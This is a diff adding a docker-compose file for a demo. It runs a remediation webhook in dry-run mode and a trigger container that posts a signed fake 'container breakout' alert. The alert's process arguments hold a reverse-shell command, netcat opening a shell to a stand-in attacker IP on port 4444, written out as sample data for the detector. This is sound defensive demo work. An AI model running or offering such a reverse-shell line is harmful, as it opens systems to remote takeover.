@@ -1,0 +1,57 @@
+services:
+  webhook:
+    build: ./cloud-run-webhook
+    ports:
+      - "8080:8080"
+    environment:
+      ZTRE_WEBHOOK_SECRET: devfest2026
+      ZTRE_DRY_RUN: "true"
+      GEMINI_API_KEY: ""
+      PORT: "8080"
+    healthcheck:
+      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8080/healthz')"]
+      interval: 3s
+      timeout: 2s
+      retries: 5
+    restart: unless-stopped
+
+  demo-trigger:
+    image: python:3.11-slim
+    depends_on:
+      webhook:
+        condition: service_healthy
+    environment:
+      ZTRE_WEBHOOK_SECRET: devfest2026
+    entrypoint: ["python", "-c"]
+    command:
+      - |
+        import hashlib, hmac, json, urllib.request, time
+        time.sleep(2)
+        secret = "devfest2026"
+        payload = json.dumps({
+            "event_id": "demo-compose-01",
+            "timestamp": "2026-11-21T09:00:00Z",
+            "policy_name": "detect-container-breakout",
+            "workload": {
+                "namespace": "modernized-app",
+                "pod_name": "payment-service-x7k9",
+                "uid": "uid-compose-001"
+            },
+            "process": {
+                "binary": "/bin/sh",
+                "arguments": "-c nc 198.51.100.1 4444 -e /bin/sh",
+                "parent_binary": "/usr/bin/node"
+            }
+        }).encode()
+        sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
+        req = urllib.request.Request(
+            "http://webhook:8080/v1/remediate",
+            data=payload,
+            headers={
+                "Content-Type": "application/json",
+                "X-ZTRE-Signature": f"sha256={sig}"
+            }
+        )
+        resp = urllib.request.urlopen(req)
+        result = json.loads(resp.read())
+        print(json.dumps(result, indent=2))
